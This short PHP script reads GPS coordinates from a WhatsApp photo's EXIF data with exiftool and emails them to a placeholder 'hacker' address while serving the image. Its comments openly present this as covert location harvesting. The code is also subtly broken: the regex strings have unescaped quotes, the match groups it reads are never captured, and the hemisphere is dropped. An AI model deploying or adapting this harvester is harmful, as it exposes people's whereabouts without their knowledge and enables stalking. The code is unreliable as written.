<?php
// 1. Define the image file name
$filename = "WhatsApp Image 2026-05-21 at 1.01.26.jpg";

// 2. Run the ExifTool command on the server
$command = "exiftool " . escapeshellarg($filename) . " | grep GPS";

// 3. Execute the command and capture the output
$output = shell_exec($command);

// 4. Parse the output (This is the code that reads the messy text!)
$lat = null;
$lon = null;

// Regex pattern to find Latitude and Longitude from ExifTool's messy output
preg_match('/GPS Latitude\s+:\s*(\d+ deg\s+\d+'\d+'\s*\d+\.\d+" [NS])/i', $output, $matchesLat);
preg_match('/GPS Longitude\s+:\s*(\d+ deg\s+\d+'\d+'\s*\d+\.\d+" [EW])/i', $output, $matchesLon);

// 5. Convert D/M/S to Decimal Degrees (The math magic!)
if ($matchesLat && $matchesLon) {
    // Latitude conversion: Degrees + (Minutes/60) + (Seconds/3600)
    $lat = floatval($matchesLat[1]) + (floatval($matchesLat[2]) / 60) + (floatval($matchesLat[3]) / 3600);
    // Longitude conversion
    $lon = floatval($matchesLon[1]) + (floatval($matchesLon[2]) / 60) + (floatval($matchesLon[3]) / 3600);
    
    // 6. Send the data to the email (The passive alert)
    $log_entry = "[" . date("Y-m-d H:i:s") . "] Location Harvested VIA EXIF. Lat: {$lat}, Lon: {$lon}";
    mail('your_hacker_email@example.com', '🛰️ EXIF HARVEST COMPLETE 🛰️', $log_entry);
}

// 7. Deliver the Image! (The final step to the browser)
header('Content-Type: image/jpeg');
readfile($filename); 
